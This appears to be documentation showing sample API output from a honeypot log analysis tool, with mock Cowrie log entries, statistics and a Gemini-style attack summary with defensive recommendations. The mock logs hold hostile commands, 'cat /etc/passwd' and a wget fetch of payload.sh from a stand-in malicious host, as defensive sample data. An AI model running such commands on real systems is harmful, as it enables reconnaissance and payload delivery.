# Example Output

Sample API responses using mock log data.

## /logs
```json
{
  "count": 3,
  "data": [
    {
      "timestamp": "2025-11-09T10:01:22+00:00",
      "ip": "203.0.113.10",
      "event_type": "cowrie.command.input",
      "command": "uname -a",
      "username": "root",
      "password": null,
      "session": "abc123",
      "message": "CMD: uname -a",
      "raw": {"eventid": "cowrie.command.input"}
    },
    {
      "timestamp": "2025-11-09T10:01:25+00:00",
      "ip": "203.0.113.10",
      "event_type": "cowrie.command.input",
      "command": "cat /etc/passwd",
      "username": "root",
      "password": null,
      "session": "abc123",
      "message": "CMD: cat /etc/passwd",
      "raw": {"eventid": "cowrie.command.input"}
    },
    {
      "timestamp": "2025-11-09T10:01:40+00:00",
      "ip": "203.0.113.10",
      "event_type": "cowrie.command.failed",
      "command": "wget http://malicious.example/payload.sh",
      "username": "root",
      "password": null,
      "session": "abc123",
      "message": "Failed command",
      "raw": {"eventid": "cowrie.command.failed"}
    }
  ]
}
```

## /stats
```json
{
  "total_events": 3,
  "top_ips": [{"value": "203.0.113.10", "count": 3}],
  "top_commands": [
    {"value": "uname -a", "count": 1},
    {"value": "cat /etc/passwd", "count": 1},
    {"value": "wget http://malicious.example/payload.sh", "count": 1}
  ],
  "credential_attempts": [{"value": "root:None", "count": 3}]
}
```

## /summary (LLM Fallback Example)
```json
{
  "summary": "LLM not initialized (missing or invalid GOOGLE_API_KEY).",
  "tactics": [],
  "recommendations": ["Set GOOGLE_API_KEY to enable Gemini analysis"]
}
```

## /summary (Possible Gemini Response)
```json
{
  "summary": "Attacker performed basic reconnaissance (uname, passwd enumeration) followed by attempted retrieval of a remote shell script.",
  "tactics": [
    "Discovery: uname -a for kernel/system info",
    "Credential/Account Enumeration: reading /etc/passwd",
    "Initial Access / Execution: attempted download of payload.sh"
  ],
  "recommendations": [
    "Block source IP at perimeter firewall",
    "Verify no outbound connections succeeded",
    "Harden SSH with key-based auth only"
  ]
}
```
